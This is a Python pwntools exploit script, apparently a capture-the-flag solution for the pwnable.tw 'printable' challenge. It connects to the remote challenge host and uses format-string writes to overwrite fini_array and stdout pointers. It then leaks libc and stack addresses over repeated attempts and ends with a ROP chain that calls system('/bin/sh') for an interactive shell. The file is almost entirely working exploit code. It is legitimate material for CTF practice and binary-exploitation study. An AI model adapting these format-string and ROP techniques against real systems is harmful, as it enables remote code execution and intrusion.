#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
A = lambda len=1, c=b'A': c * len
z = lambda len=1, c=b'\0': c * len

e = context.binary = ELF('./printable_patched')
libc = ELF('./libc_64.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# b *main+126
# b *_dl_fini+777
b *printf+148
continue
'''

def conn():
    if args.LOCAL:
        p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY)
        sleep(0.25)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10307
        return remote(host, port)

while True:
    p = conn()

    print(hex(e.bss()))
    bss = 0x601000
    fini_array = 0x600db8
    stdout_bss = 0x601020
    after_close = 0x400925
    stderr = 0x4540

    '''
    0x248
    0x40 0x925
    0x45 0x40
    '''

    k = 13
    pl = f'%{0x40}c%{k}$hn'
    pl += f'%{k+1}$hhn'
    pl += f'%{0x5}c%{k+2}$hhn'
    pl += f'%{0x248 - 0x45}c%42$hn'
    pl += f'%{0x925 - 0x248}c%{k+3}$hn'
    pl = pl.encode().ljust(56, b'A')
    pl += flat(bss + 2, stdout_bss, stdout_bss + 1, bss)
    print(len(pl))
    sa(p, b'Input :', pl)

    # Trying 
    sleep(0.25)
    pl = f'%{0x25}c%23$hhn'
    pl += f'libc-%32$p stack-%35$p'
    pl = pl.encode().ljust(0x50, b'\0')
    pl += p8(0xe0)
    s(p, pl)

    r = p.recvrepeat(timeout=1)
    if len(r) < 1 or b'Segmentation fault' in r:
        p.close()
        continue
    
    idx = r.index(b'libc-')
    libc.address = leak_hex(r[idx+5 : idx+5+14], 0x39ff8)
    lg("libc base", libc.address)

    idx = r.index(b'stack-')
    stack = leak_hex(r[idx+6 : idx+6+14])
    lg("stack", stack)

    if stack & 0xff != 0x90:
        print("fail stack")
        p.close()
        continue

    sleep(0.25)
    add_rsp_0x80 = libc.address + 0x000000000006b4b8 # add rsp, 0x80 ; ret

    b = []
    for i in range(4):
        b.append(((after_close >> (i*8)) & 0xff, stack - 0x1b0 + i))

    def fmtstr_byte(offset, writes, written=0):
        # expand to (byte_val, addr) pairs, sort by byte_val
        pairs = sorted(
            [(( v >> (8*i)) & 0xff, addr + i)
            for addr, v in writes.items()
            for i in range((v.bit_length() + 7) // 8 or 1)],
            key=lambda x: x[0]
        )

        fmt = ''
        addrs = []
        for i, (byte, addr) in enumerate(pairs):
            diff = (byte - written) % 256
            fmt += (f'%{diff}c' if diff else '') + f'%{offset + i}$hhn'
            written = byte
            addrs.append(addr)

        fmt = fmt.ljust((len(fmt) + 7) & ~7, 'X')  # align to 8 bytes
        return fmt.encode() + b''.join(pack(a) for a in addrs)

    b = sorted(b)

    writes = {
        stack - 0x1b0: after_close,        # say this is 0x4141414141414141 → 8 pairs
        stack - 0x1a8: add_rsp_0x80 & 0xffff      # → 4 pairs
    }
    pl = fmtstr_byte(offset=20, writes=writes)
    s(p, pl)

    sleep(0.25)
    writes = {
        stack - 0x1b0: after_close,        # say this is 0x4141414141414141 → 8 pairs
        stack - 0x1a8 + 2: (add_rsp_0x80 >> (8 * 2)) & 0xffff         # → 4 pairs
    }
    pl = fmtstr_byte(offset=20, writes=writes)
    s(p, pl)

    sleep(0.25)
    writes = {
        stack - 0x1b0: after_close,        # say this is 0x4141414141414141 → 8 pairs
        stack - 0x1a8 + 4: (add_rsp_0x80 >> (8 * 4)) & 0xffff         # → 4 pairs
    }
    pl = fmtstr_byte(offset=20, writes=writes)
    s(p, pl)

    sleep(0.25)
    writes = {
        stack - 0x1b0: 0x4009c4,        # say this is 0x4141414141414141 → 8 pairs
    }
    pl = fmtstr_byte(offset=18, writes=writes).ljust(0x50, b'\0')
    pl += flat(
        libc.address + 0x0000000000021102, # pop rdi ; ret
        binsh(libc),
        libc.symbols['system']
    )
    s(p, pl)

    ia(p)
    p.close()
    break
